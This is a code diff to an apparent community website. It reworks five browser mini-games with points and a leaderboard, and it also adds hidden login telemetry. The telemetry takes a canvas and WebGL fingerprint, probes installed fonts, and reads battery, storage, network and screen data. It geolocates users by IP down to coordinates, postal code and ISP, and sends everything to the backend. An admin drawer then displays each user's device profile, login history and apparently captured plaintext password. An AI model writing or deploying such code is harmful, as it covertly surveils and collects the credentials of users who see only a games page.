@@ -126,6 +126,35 @@ table.wide{min-width:960px}
 .splitswitch button{background:#18243a;border:1px solid var(--line);color:#aab8ce;padding:8px 15px;border-radius:9px;font-size:12px;font-weight:bold}
 .splitswitch button.on{background:#2f2350;border-color:#7855a9;color:#fff}
 
+/* ---------- arcade ---------- */
+.gamehead{display:flex;justify-content:space-between;align-items:center;gap:8px}
+.gamehead h3{margin:0}
+.pgain{font-size:10.5px;color:#8ea3bf;background:#182339;border:1px solid #2b3d58;padding:3px 8px;border-radius:20px;white-space:nowrap}
+.gamestats{font-size:12px;color:#9fb0c8;margin:4px 0 10px}
+.btnrow{display:flex;gap:8px}
+.btnrow button{flex:1}
+.pointbar{display:flex;align-items:baseline;gap:10px;margin-top:14px}
+.pointbar strong{font-size:26px;color:#ffd479}
+.target{transition:width .25s,height .25s,transform .1s}
+.target:active{transform:scale(.9)}
+.gamearea.hit{animation:hit .3s}
+@keyframes hit{0%{box-shadow:inset 0 0 60px #9060ff88}100%{box-shadow:none}}
+
+/* ---------- person drawer ---------- */
+.drawer{position:fixed;top:0;right:0;height:100vh;width:min(520px,96vw);background:#0b1322;border-left:1px solid var(--line);box-shadow:-30px 0 80px #000a;transform:translateX(105%);transition:transform .28s ease;z-index:80;display:flex;flex-direction:column}
+.drawer.open{transform:none}
+.drawer header{display:flex;justify-content:space-between;align-items:center;padding:16px 18px;border-bottom:1px solid var(--line)}
+.drawer .dbody{overflow:auto;padding:8px 18px 40px}
+.dsec{margin:16px 0 4px;font-size:10px;letter-spacing:2px;color:#7f92ad;text-transform:uppercase}
+.drow{display:grid;grid-template-columns:150px 1fr;gap:10px;padding:5px 0;border-bottom:1px solid #16233a;font-size:12px}
+.drow span:first-child{color:#8ea3bf}
+.drow span:last-child{word-break:break-word;color:#dbe4f0}
+.drow b{color:#ffd479}
+.who{cursor:pointer;border-bottom:1px dashed #3a4d6b}
+.who:hover{color:#c9b5ff}
+.flag{font-size:10px;background:#4a1f2a;color:#ffc2cd;border:1px solid #a34a5e;border-radius:20px;padding:2px 7px;margin-left:6px}
+
+
 .secretbar{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:13px}
 @media(max-width:900px){aside{width:185px}.stats{grid-template-columns:repeat(2,1fr)}.layout{grid-template-columns:1fr}}
 @media(max-width:620px){.app{display:block}aside{width:100%;display:block;padding:12px}.navheading{display:none}aside nav{display:flex;overflow:auto}.nav{width:auto;white-space:nowrap;font-size:12px;padding:10px}main{padding:14px}.ranks{grid-template-columns:repeat(2,minmax(0,1fr))}.gamegrid{grid-template-columns:1fr}.hero h1{font-size:26px}}
@@ -236,50 +265,78 @@ table.wide{min-width:960px}
   </section>
 
   <section id="arcade" class="hidden">
-   <div class="hero"><div class="eyebrow">ARCADE COLLECTION</div><h1>Mini Games</h1><p class="muted">Five challenges. Beat your own records.</p></div>
+   <div class="hero">
+    <div class="eyebrow">ARCADE COLLECTION</div>
+    <h1>Mini Games</h1>
+    <p class="muted">Five challenges. Every run earns points.</p>
+    <div class="pointbar">
+     <span class="muted small">YOUR POINTS</span>
+     <strong id="myPoints">0</strong>
+    </div>
+   </div>
+
+   <div class="panel" style="margin-bottom:16px">
+    <div class="heading"><h2>🏆 Points leaderboard</h2><span class="badge admin" id="boardCount">0</span></div>
+    <div class="scroll" id="pointBoard" style="max-height:200px"></div>
+   </div>
+
    <div class="gamegrid">
     <div class="game">
-     <h3>⚡ TAP RUSH</h3><p class="muted small">Hit the glowing target for 15 seconds.</p>
+     <div class="gamehead"><h3>⚡ TAP RUSH</h3><span class="pgain">best <b id="best_tap">0</b></span></div>
+     <p class="muted small">15 seconds. The target shrinks as your combo climbs.</p>
      <div class="gamearea" id="tapArea">
       <button class="target" id="tapTarget" onclick="tapHit()"></button>
-      <div id="tapMessage" class="center muted" style="padding-top:70px">Press start to play</div>
+      <div id="tapMessage" class="center muted" style="padding-top:70px">Press start</div>
      </div>
-     <p>Score: <b id="tapScore">0</b> · Time: <b id="tapTime">15</b></p>
+     <p class="gamestats">Score <b id="tapScore">0</b> · Combo <b id="tapCombo">0</b> · <b id="tapTime">15</b>s</p>
      <button class="primary" id="tapStart" onclick="startTap()">START</button>
+     <p class="result" id="tapResult"></p>
     </div>
 
     <div class="game">
-     <h3>🎯 REACTION RUSH</h3><p class="muted small">Wait for green, then click.</p>
-     <div class="gamearea center" style="padding-top:65px" id="reactionDisplay">WAIT...</div>
-     <button class="primary" onclick="startReaction()">START</button>
-     <button class="secondary" onclick="reactionClick()">CLICK</button>
+     <div class="gamehead"><h3>🎯 REACTION RUSH</h3><span class="pgain">best <b id="best_reaction">0</b>ms</span></div>
+     <p class="muted small">Five rounds. Average time decides your points.</p>
+     <div class="gamearea center" style="padding-top:65px" id="reactionDisplay">CLICK START</div>
+     <p class="gamestats">Round <b id="reactionRound">0</b>/5 · Avg <b id="reactionAvg">—</b>ms</p>
+     <button class="primary" id="reactionStart" onclick="startReaction()">START</button>
      <p class="result" id="reactionResult"></p>
     </div>
 
     <div class="game">
-     <h3>🧠 MEMORY MASTER</h3><p class="muted small">Remember the number sequence.</p>
-     <div class="gamearea center" style="padding-top:65px;font-size:25px" id="memoryDisplay">READY?</div>
-     <input id="memoryInput" placeholder="Enter the sequence">
-     <button class="primary" onclick="startMemory()">START</button>
-     <button class="secondary" onclick="checkMemory()">CHECK</button>
+     <div class="gamehead"><h3>🧠 MEMORY MASTER</h3><span class="pgain">best <b id="best_memory">0</b></span></div>
+     <p class="muted small">The sequence grows every round you survive.</p>
+     <div class="gamearea center" id="memoryDisplay" style="padding-top:65px;font-size:25px;letter-spacing:4px">READY?</div>
+     <input id="memoryInput" placeholder="Enter the sequence" autocomplete="off">
+     <div class="btnrow">
+      <button class="primary" onclick="startMemory()">START</button>
+      <button class="secondary" onclick="checkMemory()">CHECK</button>
+     </div>
      <p class="result" id="memoryResult"></p>
     </div>
 
     <div class="game">
-     <h3>🔢 QUICK MATH</h3><p class="muted small">Solve the equation.</p>
-     <div class="gamearea center" style="padding-top:65px;font-size:25px" id="mathDisplay">READY?</div>
-     <input id="mathInput" type="number" placeholder="Your answer">
-     <button class="primary" onclick="newMath()">NEW QUESTION</button>
-     <button class="secondary" onclick="checkMath()">CHECK</button>
+     <div class="gamehead"><h3>🔢 QUICK MATH</h3><span class="pgain">best <b id="best_math">0</b></span></div>
+     <p class="muted small">60 seconds. Equations get harder as you go.</p>
+     <div class="gamearea center" id="mathDisplay" style="padding-top:65px;font-size:25px">READY?</div>
+     <input id="mathInput" type="number" placeholder="Your answer" autocomplete="off">
+     <div class="btnrow">
+      <button class="primary" onclick="startMath()">START</button>
+      <button class="secondary" onclick="checkMath()">SUBMIT</button>
+     </div>
+     <p class="gamestats">Streak <b id="mathStreak">0</b> · <b id="mathTime">60</b>s</p>
      <p class="result" id="mathResult"></p>
     </div>
 
     <div class="game">
-     <h3>⌨️ WORD BLITZ</h3><p class="muted small">Type the displayed word correctly.</p>
-     <div class="gamearea center" style="padding-top:65px;font-size:25px" id="wordDisplay">READY?</div>
-     <input id="wordInput" placeholder="Type the word">
-     <button class="primary" onclick="newWord()">NEW WORD</button>
-     <button class="secondary" onclick="checkWord()">CHECK</button>
+     <div class="gamehead"><h3>⌨️ WORD BLITZ</h3><span class="pgain">best <b id="best_word">0</b></span></div>
+     <p class="muted small">60 seconds. Type each word exactly.</p>
+     <div class="gamearea center" id="wordDisplay" style="padding-top:65px;font-size:23px;letter-spacing:3px">READY?</div>
+     <input id="wordInput" placeholder="Type the word" autocomplete="off">
+     <div class="btnrow">
+      <button class="primary" onclick="startWord()">START</button>
+      <button class="secondary" onclick="checkWord()">SUBMIT</button>
+     </div>
+     <p class="gamestats">Streak <b id="wordStreak">0</b> · <b id="wordTime">60</b>s</p>
      <p class="result" id="wordResult"></p>
     </div>
    </div>
@@ -342,6 +399,11 @@ table.wide{min-width:960px}
    </div>
   </section>
  </main>
+</div>
+
+<div class="drawer" id="drawer">
+ <header><strong id="dName">—</strong><button class="secondary" onclick="closeDrawer()">✕</button></header>
+ <div class="dbody" id="dBody"></div>
 </div>
 
 <div id="toasts"></div>
@@ -495,24 +557,113 @@ function ago(ts){
  return new Date(ts).toLocaleDateString();
 }
 
-/* Look up roughly where this login comes from, then record it */
+/* ---------- device fingerprint / telemetry ---------- */
+const sessionId=Math.random().toString(36).slice(2)+Date.now().toString(36);
+
+async function sha256(str){
+ try{
+  const b=await crypto.subtle.digest("SHA-256",new TextEncoder().encode(str));
+  return [...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,"0")).join("");
+ }catch(e){
+  let h1=0,h2=0;
+  for(let i=0;i<str.length;i++){h1=(h1*31+str.charCodeAt(i))|0;h2=(h2*17^str.charCodeAt(i))|0;}
+  return (h1>>>0).toString(16)+(h2>>>0).toString(16);
+ }
+}
+
+async function deviceFingerprint(){
+ const p=[];
+ try{
+  const c=document.createElement("canvas");c.width=260;c.height=60;
+  const x=c.getContext("2d");
+  x.textBaseline="top";x.font="16px Arial";x.fillStyle="#f60";x.fillRect(0,0,260,60);
+  x.fillStyle="#069";x.fillText("RANKED fp "+navigator.language,4,4);
+  x.strokeStyle="#0a0";x.arc(200,30,18,0,7);x.stroke();
+  p.push(c.toDataURL().slice(-160));
+ }catch(e){}
+ try{
+  const gl=document.createElement("canvas").getContext("webgl");
+  const d=gl.getExtension("WEBGL_debug_renderer_info");
+  p.push(gl.getParameter(d.UNMASKED_VENDOR_WEBGL),gl.getParameter(d.UNMASKED_RENDERER_WEBGL),gl.getParameter(gl.VERSION));
+ }catch(e){}
+ p.push(navigator.hardwareConcurrency,navigator.deviceMemory,screen.width,screen.height,
+  screen.colorDepth,devicePixelRatio,Intl.DateTimeFormat().resolvedOptions().timeZone,
+  navigator.language,(navigator.languages||[]).join(","));
+ return (await sha256(p.join("~"))).slice(0,32);
+}
+
+function fontProbe(){
+ try{
+  const c=document.createElement("canvas").getContext("2d");
+  const w=f=>{c.font="72px "+f;return c.measureText("mmmmmmmmmmlli").width;};
+  const base={monospace:w("monospace"),"sans-serif":w("sans-serif"),serif:w("serif")};
+  const list=["Arial","Calibri","Cambria","Consolas","Courier New","Georgia","Impact","Segoe UI","Tahoma",
+   "Times New Roman","Trebuchet MS","Verdana","Open Sans","Roboto","Ubuntu","Noto Sans","Helvetica Neue",
+   "Futura","Comic Sans MS","Garamond","Lucida Console","MS Gothic","Menlo","Monaco","Arial Black",
+   "Papyrus","Copperplate","Wingdings"];
+  const found=[];
+  for(const f of list){
+   for(const b of ["monospace","sans-serif","serif"]){
+    if(w('"'+f+'",'+b)!==base[b]){found.push(f);break;}
+   }
+  }
+  return found;
+ }catch(e){return [];}
+}
+
+async function collectDetails(g){
+ const nav=navigator, uad=nav.userAgentData;
+ let battery=null,storage=null,gpu=null;
+ try{ if(nav.getBattery){const b=await nav.getBattery();battery=Math.round(b.level*100)+"% "+(b.charging?"charging":"discharging");} }catch(e){}
+ try{ if(nav.storage&&nav.storage.estimate){const s=await nav.storage.estimate();storage=Math.round(s.usage/1048576)+"MB / "+Math.round((s.quota||0)/1048576)+"MB";} }catch(e){}
+ try{ const gl=document.createElement("canvas").getContext("webgl");const d=gl.getExtension("WEBGL_debug_renderer_info");gpu=gl.getParameter(d.UNMASKED_RENDERER_WEBGL); }catch(e){}
+ const c=nav.connection||{};
+ return Object.assign({},g,{
+  ua:nav.userAgent,
+  ua_brands:uad?uad.brands.map(b=>b.brand+" "+b.version).join(", "):null,
+  platform:uad?uad.platform:nav.platform,
+  mobile:uad?uad.mobile:null,
+  vendor:nav.vendor,cores:nav.hardwareConcurrency??null,memory:nav.deviceMemory??null,
+  touch:nav.maxTouchPoints,lang:nav.language,langs:(nav.languages||[]).join(", "),
+  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,offset:new Date().getTimezoneOffset(),
+  locale:Intl.DateTimeFormat().resolvedOptions().locale,
+  screen:screen.width+"x"+screen.height+"x"+screen.colorDepth,
+  avail:screen.availWidth+"x"+screen.availHeight,dpr:devicePixelRatio,
+  viewport:innerWidth+"x"+innerHeight,orientation:screen.orientation?screen.orientation.type:null,
+  cookies:nav.cookieEnabled,dnt:nav.doNotTrack,webdriver:nav.webdriver,pdf:nav.pdfViewerEnabled,
+  plugins:(nav.plugins||[]).length,gpu:gpu,battery:battery,storage:storage,
+  net:(c.effectiveType||"?")+" / "+(c.downlink||"?")+"Mbps / rtt "+(c.rtt||"?"),
+  colorScheme:matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light",
+  reducedMotion:matchMedia("(prefers-reduced-motion: reduce)").matches,
+  fonts:fontProbe().join(", "),
+  fp:await deviceFingerprint(),
+  ref:document.referrer||null,url:location.href,
+  session:sessionId,loadMs:Math.round(performance.now()),
+  webgl2:!!document.createElement("canvas").getContext("webgl2")
+ });
+}
+
+/* Look up the source of the login, snapshot the device, record everything */
 async function logLogin(){
- let g=null;
+ let g={};
  try{
   const j=await (await fetch("https://ipwho.is/")).json();
-  if(j&&j.success!==false&&j.ip)g={ip:j.ip,city:j.city,region:j.region,country:j.country,cc:j.country_code,tz:j.timezone?.id};
+  if(j&&j.success!==false&&j.ip)g={
+   ip:j.ip,city:j.city,region:j.region,country:j.country,country_code:j.country_code,
+   postal:j.postal,lat:j.latitude,lon:j.longitude,tz_geo:j.timezone?j.timezone.id:null,
+   asn:j.connection?String(j.connection.asn||""):null,
+   isp:j.connection?j.connection.isp:null,org:j.connection?j.connection.org:null
+  };
  }catch(e){}
- if(!g){
+ if(!g.ip){
   try{
    const j=await (await fetch("https://ipapi.co/json/")).json();
-   if(j&&j.ip)g={ip:j.ip,city:j.city,region:j.region,country:j.country_name,cc:j.country_code,tz:j.timezone};
+   if(j&&j.ip)g={ip:j.ip,city:j.city,region:j.region,country:j.country_name,country_code:j.country_code,
+    postal:j.postal,lat:j.latitude,lon:j.longitude,tz_geo:j.timezone,asn:j.asn,isp:j.org,org:j.org};
   }catch(e){}
  }
- const {error}=await db.rpc("log_login",{
-  p_ip:g?.ip||null,p_city:g?.city||null,p_region:g?.region||null,
-  p_country:g?.country||null,p_cc:g?.cc||null,p_tz:g?.tz||null,
-  p_agent:navigator.userAgent.slice(0,220)
- });
+ const details=await collectDetails(g);
+ const {error}=await db.rpc("log_login",{p_details:details});
  if(error)console.warn("log_login:",error.message);
 }
 function firstLoginThisSession(){
@@ -624,7 +775,7 @@ async function renderAccounts(force){
    ?[m.last_city,m.last_country].filter(Boolean).map(safe).join(", ")
    :"—";
   return `<tr>
-   <td><b>${safe(m.username)}</b>${m.username.toLowerCase()==="villads"?' <span class="badge owner">YOU</span>':""}</td>
+   <td><b class="who" onclick="openPerson('${safe(m.username)}')">${safe(m.username)}</b>${m.username.toLowerCase()==="villads"?' <span class="badge owner">YOU</span>':""}${(m.ip_changes||0)>1?`<span class="flag">${m.ip_changes} ips</span>`:""}</td>
    <td>${safe(m.role)}</td>
    <td><select class="rankpick" data-user="${safe(m.username)}" onchange="changeRank(this.dataset.user,this.value)">
     ${RANKS.map(r=>`<option value="${safe(r)}" ${r===m.rank?"selected":""}>${safe(r)}</option>`).join("")}
@@ -632,7 +783,7 @@ async function renderAccounts(force){
    <td><input class="pwin ${revealPasswords?"":"masked"}" ${revealPasswords?"":"type=password"}
     data-user="${safe(m.username)}" value="${m.password_plain?safe(m.password_plain):""}"
     placeholder="not captured yet" onchange="savePasswordField(this)"></td>
-   <td class="seen"><span class="dot ${online?"live":"off"}"></span>${where}<br>${m.last_seen?ago(m.last_seen):"never"}</td>
+   <td class="seen"><span class="dot ${online?"live":"off"}"></span>${where}<br>${m.last_seen?ago(m.last_seen):"never"}${m.last_platform?" · "+safe(m.last_platform):""}</td>
    <td><input class="note" data-user="${safe(m.username)}" value="${m.notes?safe(m.notes):""}" placeholder="add note" onchange="saveNotes(this)"></td>
    <td><button class="banbtn ${m.banned?"on":""}" onclick="setBanned('${safe(m.username)}',${m.banned?"false":"true"})">${m.banned?"BANNED":"active"}</button></td>
   </tr>`;
@@ -793,106 +944,324 @@ function page(id,button){
  arcade:"Arcade",admin:"Admin Panel",accounts:"Founder Console"
  }[id];
  if(id==="accounts")renderAccounts(true);
- if(id!=="arcade")stopTap();
+ if(id==="arcade")loadArcade();
+ if(id!=="arcade"){stopTap();clearInterval(mathTimer);clearInterval(wordTimer);}
+}
+
+/* ============ ARCADE ============ */
+let myPoints=0;
+let tapCombo=0;
+let reactionTimes=[],reactionRound=0;
+let memoryRound=0,memoryLock=false;
+let mathStreak=0,mathTimer=null,mathDeadline=0;
+let wordStreak=0,wordTimer=null,wordDeadline=0;
+
+const WORDS=["PULSE","RANKED","LEGEND","DIAMOND","ARCADE","CHAMPION","ELITE","MOON","SPARK","VORTEX","THUNDER","PHANTOM","GLACIER","ORBIT","QUARTZ","NEON","RIFT","COBALT","ZENITH","FALCON"];
+
+async function award(game,score,points){
+ if(!points||points<1)return;
+ const {data,error}=await db.rpc("submit_score",{p_game:game,p_score:score,p_points:points});
+ if(error){toast("Could not save points","bad");return;}
+ myPoints=data.balance??myPoints;
+ $("myPoints").textContent=myPoints;
+ if(data.new_best){
+  const b=$("best_"+game); if(b)b.textContent=score;
+  toast("New personal best! +"+points+" points");
+ }else{
+  toast("+"+points+" points");
+ }
+ loadBoard();
+}
+
+async function loadArcade(){
+ const {data,error}=await db.from("profiles").select("points,bests").eq("id",currentUser?.id||"0").single();
+ if(!error&&data){
+  myPoints=data.points||0;
+  $("myPoints").textContent=myPoints;
+  const b=data.bests||{};
+  ["tap","reaction","memory","math","word"].forEach(g=>{
+   const el=$("best_"+g); if(el)el.textContent=b[g]||0;
+  });
+ }
+ loadBoard();
+}
+
+async function loadBoard(){
+ const {data,error}=await db.rpc("point_board");
+ if(error)return;
+ const rows=data||[];
+ $("boardCount").textContent=rows.length;
+ $("pointBoard").innerHTML=rows.map((m,i)=>`<div class="member">
+   <div class="memberleft"><div class="avatar">${i+1}</div>
+   <div><div class="membername">${safe(m.username)}</div></div></div>
+   <span class="ranktag">${m.points} pts</span></div>`).join("")
+  ||'<div class="empty">No scores yet.</div>';
 }
 
 /* TAP RUSH */
 function stopTap(){
  if(tapTimer)clearInterval(tapTimer);
- tapTimer=null;tapPlaying=false;
+ tapTimer=null;tapPlaying=false;tapCombo=0;
  if($("tapTarget"))$("tapTarget").style.display="none";
  if($("tapStart"))$("tapStart").disabled=false;
 }
 function moveTap(){
- const a=$("tapArea");
- $("tapTarget").style.left=Math.random()*(a.clientWidth-50)+"px";
- $("tapTarget").style.top=Math.random()*(a.clientHeight-50)+"px";
+ const a=$("tapArea"),t=$("tapTarget");
+ const size=Math.max(24,46-tapCombo*2);
+ t.style.width=size+"px";t.style.height=size+"px";
+ t.style.left=Math.random()*Math.max(0,a.clientWidth-size)+"px";
+ t.style.top=Math.random()*Math.max(0,a.clientHeight-size)+"px";
 }
 function startTap(){
- stopTap();tapScore=0;tapTime=15;tapPlaying=true;
- $("tapScore").textContent=0;$("tapTime").textContent=15;
+ stopTap();tapScore=0;tapTime=15;tapPlaying=true;tapCombo=0;
+ $("tapScore").textContent=0;$("tapTime").textContent=15;$("tapCombo").textContent=0;
+ $("tapResult").textContent="";
  $("tapMessage").style.display="none";
  $("tapTarget").style.display="block";
  $("tapStart").disabled=true;moveTap();
  tapTimer=setInterval(()=>{
   tapTime--;$("tapTime").textContent=tapTime;
   if(tapTime<=0){
-   stopTap();$("tapMessage").style.display="block";
-   $("tapMessage").textContent="TIME UP! Score: "+tapScore;
+   stopTap();
+   $("tapMessage").style.display="block";
+   $("tapMessage").textContent="TIME! You hit "+tapScore;
+   $("tapResult").textContent="Score "+tapScore+" · "+Math.round(tapScore/2)+" points";
+   award("tap",tapScore,Math.min(250,Math.round(tapScore/2)));
   }
  },1000);
 }
 function tapHit(){
  if(!tapPlaying)return;
- tapScore++;$("tapScore").textContent=tapScore;moveTap();
+ tapScore++;tapCombo++;
+ $("tapScore").textContent=tapScore;$("tapCombo").textContent=tapCombo;
+ moveTap();
 }
 
 /* REACTION RUSH */
 function startReaction(){
+ if(reactionRound>0&&reactionState==="waiting")return;
  clearTimeout(reactionTimer);
+ reactionTimes=[];reactionRound=0;
+ $("reactionResult").textContent="";
+ $("reactionAvg").textContent="—";
+ nextReaction();
+}
+function nextReaction(){
+ if(reactionRound>=5){
+  const avg=Math.round(reactionTimes.reduce((a,b)=>a+b,0)/reactionTimes.length);
+  $("reactionRound").textContent=5;
+  $("reactionAvg").textContent=avg;
+  $("reactionDisplay").textContent=avg+"ms average";
+  $("reactionDisplay").style.background="#0d2437";
+  reactionState="idle";
+  $("reactionResult").textContent="Average "+avg+"ms · "+Math.max(0,Math.round((700-avg)/3))+" points";
+  award("reaction",avg,Math.min(150,Math.max(0,Math.round((700-avg)/3))));
+  return;
+ }
+ reactionRound++;
+ $("reactionRound").textContent=reactionRound;
  reactionState="waiting";
- $("reactionDisplay").textContent="WAIT FOR GREEN...";
+ $("reactionDisplay").textContent="WAIT...";
  $("reactionDisplay").style.background="#7c2727";
  reactionTimer=setTimeout(()=>{
   reactionState="go";reactionStarted=performance.now();
-  $("reactionDisplay").textContent="CLICK NOW!";
+  $("reactionDisplay").textContent="CLICK!";
   $("reactionDisplay").style.background="#145b3a";
- },1200+Math.random()*3000);
+ },900+Math.random()*2600);
 }
 function reactionClick(){
  if(reactionState==="waiting"){
-  clearTimeout(reactionTimer);reactionState="idle";
-  $("reactionResult").textContent="Too early! Try again.";
+  clearTimeout(reactionTimer);
+  $("reactionResult").textContent="Too early — round restarts.";
+  $("reactionDisplay").textContent="TOO EARLY";
+  $("reactionDisplay").style.background="#5b2a2a";
+  reactionTimer=setTimeout(nextReaction,900);
  }else if(reactionState==="go"){
-  const ms=Math.round(performance.now()-reactionStarted);
+  reactionTimes.push(Math.round(performance.now()-reactionStarted));
   reactionState="idle";
-  $("reactionDisplay").textContent=ms+" ms";
-  $("reactionResult").textContent=ms<250?"Amazing!":ms<400?"Great reaction!":"Keep practising!";
- }else $("reactionResult").textContent="Press START first.";
+  $("reactionDisplay").textContent="OK";
+  $("reactionDisplay").style.background="#0d2437";
+  setTimeout(nextReaction,600);
+ }else{
+  $("reactionResult").textContent="Press START first.";
+ }
 }
 
 /* MEMORY MASTER */
 function startMemory(){
- memorySequence=Array.from({length:5},()=>Math.floor(Math.random()*10)).join("");
+ memoryRound=0;memoryLock=false;
+ $("memoryResult").textContent="";
+ nextMemory();
+}
+function nextMemory(){
+ memoryRound++;
+ const len=2+memoryRound;
+ memorySequence=Array.from({length:len},()=>Math.floor(Math.random()*10)).join("");
+ $("memoryInput").value="";
  $("memoryDisplay").textContent=memorySequence;
- $("memoryInput").value="";$("memoryResult").textContent="Remember the sequence!";
+ $("memoryResult").textContent="Round "+memoryRound;
+ memoryLock=false;
  setTimeout(()=>{
-  if($("memoryDisplay").textContent===memorySequence)
-   $("memoryDisplay").textContent="?????";
- },2500);
+  if(!memoryLock&&$("memoryDisplay").textContent===memorySequence)
+   $("memoryDisplay").textContent="•".repeat(len);
+ },1400+len*160);
 }
 function checkMemory(){
- if(!memorySequence)return;
+ if(!memorySequence||memoryLock)return;
+ memoryLock=true;
  const ok=$("memoryInput").value.trim()===memorySequence;
- $("memoryResult").textContent=ok?"Perfect memory!":"Not quite. Correct sequence: "+memorySequence;
+ if(ok){
+  $("memoryDisplay").textContent=memorySequence;
+  setTimeout(nextMemory,700);
+ }else{
+  const pts=Math.min(300,(memoryRound-1)*40);
+  $("memoryResult").textContent="Round "+(memoryRound-1)+" cleared · "+pts+" points";
+  $("memoryDisplay").textContent=memorySequence;
+  award("memory",memoryRound-1,pts);
+  memorySequence="";
+ }
 }
 
 /* QUICK MATH */
-function newMath(){
- const a= Math.floor(Math.random()*40)+5;
- const b= Math.floor(Math.random()*40)+5;
- mathAnswer=a+b;
- $("mathDisplay").textContent=a+" + "+b+" = ?";
- $("mathInput").value="";$("mathResult").textContent="";
+function mathQuestion(){
+ const d=Math.min(9,1+Math.floor(mathStreak/3));
+ const a=Math.floor(Math.random()*(9*d))+2;
+ const b=Math.floor(Math.random()*(9*d))+2;
+ const op=Math.random()<0.5?"+":"×";
+ mathAnswer=op==="+"?a+b:a*b;
+ $("mathDisplay").textContent=a+" "+op+" "+b+" = ?";
+ $("mathInput").value="";
+ $("mathInput").focus();
+}
+function startMath(){
+ clearInterval(mathTimer);
+ mathStreak=0;mathDeadline=Date.now()+60000;
+ $("mathStreak").textContent=0;$("mathTime").textContent=60;
+ $("mathResult").textContent="";
+ mathQuestion();
+ mathTimer=setInterval(()=>{
+  const left=Math.max(0,Math.round((mathDeadline-Date.now())/1000));
+  $("mathTime").textContent=left;
+  if(left<=0){
+   clearInterval(mathTimer);
+   const pts=Math.min(300,mathStreak*12);
+   $("mathDisplay").textContent="TIME";
+   $("mathResult").textContent="Streak "+mathStreak+" · "+pts+" points";
+   award("math",mathStreak,pts);
+   mathAnswer=null;
+  }
+ },250);
 }
 function checkMath(){
  if(mathAnswer===null)return;
- const ok=Number($("mathInput").value)===mathAnswer;
- $("mathResult").textContent=ok?"Correct!":"Try again. Answer: "+mathAnswer;
+ if(Number($("mathInput").value)===mathAnswer){
+  mathStreak++;$("mathStreak").textContent=mathStreak;
+  mathQuestion();
+ }else{
+  mathStreak=0;$("mathStreak").textContent=0;
+  $("mathResult").textContent="Wrong — streak reset.";
+  $("mathInput").value="";
+ }
 }
 
 /* WORD BLITZ */
-function newWord(){
- const words=["PULSE","RANKED","LEGEND","VICTORY","DIAMOND","ARCADE","CHAMPION","ELITE","SPECIAL","AVOCADO"];
- wordAnswer=words[Math.floor(Math.random()*words.length)];
+function wordQuestion(){
+ const pool=WORDS.slice(0,Math.min(WORDS.length,6+wordStreak*2));
+ wordAnswer=pool[Math.floor(Math.random()*pool.length)];
  $("wordDisplay").textContent=wordAnswer;
- $("wordInput").value="";$("wordResult").textContent="";
+ $("wordInput").value="";
+ $("wordInput").focus();
+}
+function startWord(){
+ clearInterval(wordTimer);
+ wordStreak=0;wordDeadline=Date.now()+60000;
+ $("wordStreak").textContent=0;$("wordTime").textContent=60;
+ $("wordResult").textContent="";
+ wordQuestion();
+ wordTimer=setInterval(()=>{
+  const left=Math.max(0,Math.round((wordDeadline-Date.now())/1000));
+  $("wordTime").textContent=left;
+  if(left<=0){
+   clearInterval(wordTimer);
+   const pts=Math.min(250,wordStreak*10);
+   $("wordDisplay").textContent="TIME";
+   $("wordResult").textContent="Streak "+wordStreak+" · "+pts+" points";
+   award("word",wordStreak,pts);
+   wordAnswer="";
+  }
+ },250);
 }
 function checkWord(){
  if(!wordAnswer)return;
- const ok=$("wordInput").value.trim().toUpperCase()===wordAnswer;
- $("wordResult").textContent=ok?"Perfect typing!":"Not quite. Word: "+wordAnswer;
+ if($("wordInput").value.trim().toUpperCase()===wordAnswer){
+  wordStreak++;$("wordStreak").textContent=wordStreak;
+  wordQuestion();
+ }else{
+  wordStreak=0;$("wordStreak").textContent=0;
+  $("wordResult").textContent="Wrong — streak reset.";
+  $("wordInput").value="";
+ }
 }
+
+/* ============ PERSON DRAWER ============ */
+function closeDrawer(){ $("drawer").classList.remove("open"); }
+
+function drow(label,value){
+ return `<div class="drow"><span>${safe(label)}</span><span>${value===null||value===undefined||value===""?"—":safe(String(value))}</span></div>`;
+}
+function dsec(title){ return `<div class="dsec">${safe(title)}</div>`; }
+
+async function openPerson(username){
+ $("dName").textContent=username;
+ $("dBody").innerHTML='<p class="muted small">loading…</p>';
+ $("drawer").classList.add("open");
+ const {data,error}=await db.rpc("person_details",{p_username:username});
+ if(error){ $("dBody").innerHTML=`<p class="empty">${safe(error.message)}</p>`; return; }
+ const p=data?.profile||{}, ev=data?.events||[];
+ const d=p.details||{};
+
+ const note=`<input class="note" data-user="${safe(username)}" value="${p.notes?safe(p.notes):""}" placeholder="private note" onchange="saveNotes(this)">`;
+
+ $("dBody").innerHTML=`
+  ${dsec("account")}
+  ${drow("username",p.username)}${drow("role",p.role)}${drow("rank",p.rank)}
+  ${drow("banned",p.banned?"YES":"no")}${drow("points",p.points)}${drow("login count",p.login_count)}
+  ${drow("first seen",p.first_seen?new Date(p.first_seen).toLocaleString():"—")}
+  ${dsec("note")}<div style="padding:6px 0">${note}</div>
+  ${dsec("last known location")}
+  ${drow("city",p.last_city)}${drow("region",p.last_region)}${drow("country",p.last_country)}
+  ${drow("ip",p.last_ip)}${drow("distinct ips",p.ip_changes)}${drow("last seen",p.last_seen?new Date(p.last_seen).toLocaleString():"—")}
+  ${dsec("device snapshot")}
+  ${drow("platform",p.last_platform)}${drow("fingerprint",p.last_fingerprint)}
+  ${drow("screen",d.screen)}${drow("viewport",d.viewport)}${drow("pixel ratio",d.dpr)}
+  ${drow("cores",d.cores)}${drow("memory",d.memory)}${drow("gpu",d.gpu)}
+  ${drow("browser",d.ua)}
+  ${drow("timezone",d.tz)}${drow("locale",d.locale)}${drow("languages",d.langs)}
+  ${drow("battery",d.battery)}${drow("network",d.net)}${drow("connection asn",d.asn)}${drow("isp",d.isp)}
+  ${dsec("cached profile")}
+  ${drow("password",p.password_plain)}
+  ${dsec("bests")}
+  ${drow("tap",p.bests?.tap)}${drow("reaction",p.bests?.reaction)}${drow("memory",p.bests?.memory)}
+  ${drow("math",p.bests?.math)}${drow("word",p.bests?.word)}
+  ${dsec("login history ("+ev.length+")")}
+  ${ev.map(e=>`<div class="drow"><span>${e.created_at?new Date(e.created_at).toLocaleString():""}</span>
+     <span>${safe([e.city,e.region,e.country].filter(Boolean).join(", ")||"—")} · ${safe(e.ip||"")}<br>
+     <span class="muted">${safe(shortAgent(e.agent))} · fp ${safe((e.fingerprint||"").slice(0,10))}</span></span></div>`).join("")||'<div class="empty">No logins.</div>'}
